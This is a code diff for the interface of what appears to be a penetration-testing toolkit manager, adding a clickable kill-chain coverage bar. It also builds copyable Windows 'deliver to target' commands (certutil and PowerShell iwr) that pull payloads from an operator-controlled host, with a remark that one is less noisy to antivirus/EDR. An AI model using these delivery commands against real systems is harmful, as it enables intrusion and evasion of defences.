@@ -40,6 +40,7 @@
 
   var _hideKali = true;   // "to fetch" view by default — the tools Kali doesn't already ship
   var _boxLens = 'fs';    // "Your Box" grouping: 'fs' (where it lives) | 'cap' (what it's for)
+  var _capFocus = null;   // when a readiness phase is clicked: the categories to auto-expand in the 'cap' lens
 
   // Kill-chain phases for the readiness bar: an engagement's rough progression, each fed by one or more
   // tool categories. Coverage = how many of a phase's tools are actually on the box.
@@ -269,9 +270,11 @@
       var deliver = '';
       if (isWin) {
         var fn = path.split('/').pop();
-        var dl = 'certutil -urlcache -f http://' + lhost + '/' + fn + ' ' + fn;
+        var dlCert = 'certutil -urlcache -f http://' + lhost + '/' + fn + ' ' + fn;
+        var dlPs = 'iwr http://' + lhost + '/' + fn + ' -o ' + fn;
         deliver = '<span class="lo-ti-eg"><span class="lo-ti-eg-l">Deliver to target</span>'
-          + '<code class="btn-copy lo-ti-dl" data-copy="' + U.attr(dl) + '" title="Click to copy">' + esc(dl) + '</code></span>';
+          + '<code class="btn-copy lo-ti-dl" data-copy="' + U.attr(dlCert) + '" title="certutil — built into every Windows, but AV/EDR-noisy. Click to copy.">' + esc(dlCert) + '</code>'
+          + '<code class="btn-copy lo-ti-dl" data-copy="' + U.attr(dlPs) + '" title="PowerShell Invoke-WebRequest — cleaner, needs PowerShell. Click to copy.">' + esc(dlPs) + '</code></span>';
       }
       return '<span class="lo-ti-card" role="tooltip">'
         + '<span class="lo-ti-card-h"><span class="lo-ti-name">' + esc(e.label || e.key) + '</span>'
@@ -292,7 +295,7 @@
         + card(it.e, it.inv, it.path) + '</span>';
     }
     // node: collapsed summary = path + count + the distinct category colors inside (no name echo). Open → chips.
-    function node(path, items) {
+    function node(path, items, footer) {
       if (!items.length) return '';
       var seenCat = {};
       items.forEach(function (it) { if (it.e) seenCat[it.e.category || 'Support'] = 1; });
@@ -302,7 +305,7 @@
       var body = items.map(chip).join('');
       return '<details class="lo-fs-node"><summary class="lo-fs-row"><code class="lo-fs-path">' + esc(path) + '</code>'
         + '<span class="lo-fs-n">' + items.length + '</span><span class="lo-nd-dots">' + dots + '</span></summary>'
-        + '<div class="lo-fs-items">' + body + '</div></details>';
+        + '<div class="lo-fs-items">' + body + (footer || '') + '</div></details>';
     }
     function winItem(f) { var e = resolveDest(f); return { label: f, e: e, inv: (e && e.canonical) || '', path: '~/.obol/arsenal/win/' + f }; }
     function keyItem(k, path) { var e = A[k]; return { label: (e && e.label) || k, e: e, inv: (tools[k] && tools[k].invocation) || (e && e.canonical) || k, path: path }; }
@@ -313,7 +316,7 @@
         + '<code class="btn-copy lo-serve-cmd" data-copy="' + U.attr(serveCmd) + '" title="Click to copy">' + esc(serveCmd) + '</code>'
         + '<span class="lo-serve-hint">then pull each from the target (hover a payload)</span></div>'
       : '';
-    var fsRows = node('~/.obol/arsenal/win', winNames.map(winItem)) + serveHelper
+    var fsRows = node('~/.obol/arsenal/win', winNames.map(winItem), serveHelper)
       + node('~/.obol/arsenal', linCache.map(function (k) { return keyItem(k, '~/.obol/arsenal/' + ((A[k] && A[k].dest) || k)); }))
       + node('~/.local/bin', pipx.map(function (k) { return keyItem(k, (tools[k] && tools[k].path) || ''); }))
       + node('~/tools', cloned.map(function (k) { return keyItem(k, (prof.cloned && prof.cloned[k]) || (tools[k] && tools[k].path) || ''); }))
@@ -337,7 +340,8 @@
         });
         items.sort(function (a, b) { return (a.missing ? 1 : 0) - (b.missing ? 1 : 0) || (a.label < b.label ? -1 : 1); });
         var readyN = items.filter(function (it) { return !it.missing; }).length;
-        return '<details class="lo-fs-node"><summary class="lo-fs-row">'
+        var open = (_capFocus && _capFocus.indexOf(cat) >= 0) ? ' open' : '';
+        return '<details class="lo-fs-node"' + open + '><summary class="lo-fs-row">'
           + '<span class="lo-cap-name lo-catc-' + catSlug(cat) + '">' + esc(titleCase(cat)) + '</span>'
           + '<span class="lo-fs-n">' + readyN + '/' + list.length + '</span>'
           + '<span class="lo-nd-dots"><span class="lo-nd-dot lo-catc-' + catSlug(cat) + '"></span></span></summary>'
@@ -348,15 +352,22 @@
     // kill-chain readiness bar: coverage per engagement phase.
     function readinessBar() {
       var cats = byCategory();
-      var segs = PHASES.map(function (ph) {
+      var segs = PHASES.map(function (ph, i) {
         var tot = 0, rdy = 0;
-        ph.cats.forEach(function (c) { (cats[c] || []).forEach(function (e) { tot++; if (isPresent(e, prof)) rdy++; }); });
+        ph.cats.forEach(function (c) {
+          (cats[c] || []).forEach(function (e) {
+            if (e.class === 'builtin') return;   // target-side/always-present commands aren't "kit" we provision
+            tot++; if (isPresent(e, prof)) rdy++;
+          });
+        });
         if (!tot) return '';
         var cls = rdy >= tot ? 'lo-kc-full' : (rdy > 0 ? 'lo-kc-part' : 'lo-kc-none');
-        return '<div class="lo-kc ' + cls + '" title="' + U.attr(ph.name + ': ' + rdy + ' of ' + tot + ' tools ready') + '">'
-          + '<span class="lo-kc-n">' + esc(ph.name) + '</span><span class="lo-kc-v">' + rdy + '/' + tot + '</span></div>';
+        return '<button class="lo-kc ' + cls + '" type="button" data-phase="' + i + '" title="' + U.attr(ph.name + ': ' + rdy + ' of ' + tot + ' tools on your box — click to see them') + '">'
+          + '<span class="lo-kc-n">' + esc(ph.name) + '</span><span class="lo-kc-v">' + rdy + '/' + tot + '</span></button>';
       }).join('');
-      return '<div class="lo-kcbar" aria-label="Kill-chain readiness">' + segs + '</div>';
+      return '<div class="lo-kc-head"><span class="lo-kc-title">Kill-chain coverage</span>'
+        + '<span class="lo-kc-key"><span class="lo-kc-kd lo-kc-full"></span>equipped<span class="lo-kc-kd lo-kc-part"></span>partial<span class="lo-kc-kd lo-kc-none"></span>none</span></div>'
+        + '<div class="lo-kcbar" aria-label="Kill-chain coverage by phase">' + segs + '</div>';
     }
 
     var lensToggle = '<div class="lo-lens2" role="tablist">'
@@ -458,7 +469,13 @@
     U.on(mount, 'click', '.lo-download', function () { doDownload(mount); });
     U.on(mount, 'change', '.lo-stamp-opt', function (e, t) { stampSet(!!t.checked); });
     U.on(mount, 'change', '#lo-hidekali', function (e, t) { _hideKali = !!t.checked; OBOL.router.render(); });
-    U.on(mount, 'click', '.lo-lens2-opt', function (e, t) { _boxLens = t.getAttribute('data-lens') || 'fs'; OBOL.router.render(); });
+    U.on(mount, 'click', '.lo-lens2-opt', function (e, t) { _boxLens = t.getAttribute('data-lens') || 'fs'; _capFocus = null; OBOL.router.render(); });
+    U.on(mount, 'click', '.lo-kc', function (e, t) {
+      var i = parseInt(t.getAttribute('data-phase'), 10);
+      if (isNaN(i) || !PHASES[i]) return;
+      _boxLens = 'cap'; _capFocus = PHASES[i].cats; OBOL.router.render();
+      setTimeout(function () { var el = document.querySelector('.lo-fs-node[open] .lo-cap-name'); if (el) el.scrollIntoView({ behavior: 'smooth', block: 'center' }); }, 60);
+    });
     U.on(mount, 'click', '.lo-ingest', function (e, t) {
       var box = mount.querySelector('.lo-paste'), msg = mount.querySelector('.lo-paste-msg');
       var text = (box && box.value) || '';
